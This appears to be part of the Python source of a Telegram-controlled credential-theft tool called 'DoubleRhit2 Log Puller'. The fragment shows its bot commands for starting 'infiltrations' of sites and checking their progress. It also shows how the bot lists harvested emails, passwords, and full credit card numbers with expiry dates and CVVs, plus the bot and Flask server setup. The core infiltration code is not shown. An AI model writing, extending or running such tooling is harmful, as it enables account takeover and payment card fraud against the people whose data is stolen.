async def status_command(update: Update, context: CallbackContext):
    # Get latest infiltration
    if doublerhit2.active_infiltrations:
        latest_id = list(doublerhit2.active_infiltrations.keys())[-1]
        result = doublerhit2.get_infiltration_status(latest_id)
        
        if result["status"] == "success":
            infiltration = result["infiltration"]
            await update.message.reply_text(
                f"Infiltration Status\n"
                f"Site: {infiltration['site']}\n"
                f"Completed: {infiltration['completed']}/{infiltration['angles']}\n"
                f"Credentials Found: {infiltration['credentials_found']}"
            )
        else:
            await update.message.reply_text(f"Error: {result['message']}")
    else:
        await update.message.reply_text("No active infiltrations")

async def creds_command(update: Update, context: CallbackContext):
    site_key = context.args[0] if context.args else None
    limit = 5  # Limit for Telegram display
    
    if site_key:
        credentials = doublerhit2.get_credentials(site_key=site_key, limit=limit)
    else:
        credentials = doublerhit2.get_credentials(limit=limit)
    
    if credentials:
        message = f"Credentials ({len(credentials)} shown):\n\n"
        for cred in credentials:
            message += f"Site: {cred['site']}\n"
            message += f"Email: {cred['email']}\n"
            message += f"Password: {cred['password']}\n"
            if cred['cc_number']:
                message += f"CC: {cred['cc_number']}\n"
                message += f"Expiry: {cred['cc_expiry']}\n"
                message += f"CVV: {cred['cc_cvv']}\n"
            message += f"Confidence: {cred['confidence']:.2f}\n"
            message += f"Time: {cred['timestamp']}\n\n"
        
        # Telegram message length limit
        if len(message) > 4000:
            message = message[:4000] + "..."
        
        await update.message.reply_text(message)
    else:
        await update.message.reply_text("No credentials found")

async def help_command(update: Update, context: CallbackContext):
    help_text = (
        "DoubleRhit2 Log Puller Commands:\n\n"
        "/start - Show main menu\n"
        "/infiltrate [site] - Start infiltration\n"
        "/status - Check infiltration status\n"
        "/creds [site] - Get credentials\n"
        "/help - Show this help"
    )
    await update.message.reply_text(help_text)

# Replace the entire bot initialization section at the bottom with this:

def init_telegram_bot():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("infiltrate", infiltrate_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("creds", creds_command))
        application.add_handler(CommandHandler("help", help_command))
        
        # Add callback handler for inline buttons
        application.add_handler(telegram.ext.CallbackQueryHandler(button_callback))
        
        # Initialize the bot
        application.initialize()
        application.start()
        
        # Start bot in a background thread
        def run_bot():
            application.run_polling()
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        # Test connection
        bot = telegram.Bot(token=BOT_TOKEN)
        bot_info = bot.get_me()
        print(f"Bot connected: @{bot_info.username}")
        
        return application
    except Exception as e:
        print(f"Failed to initialize Telegram bot: {e}")
        return None

if __name__ == "__main__":
    # Initialize database
    init_db()
    
    # Initialize credential validator
    doublerhit2.initialize_validator()
    
    # Initialize Telegram bot
    bot_app = init_telegram_bot()
    
    # Start Flask app
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
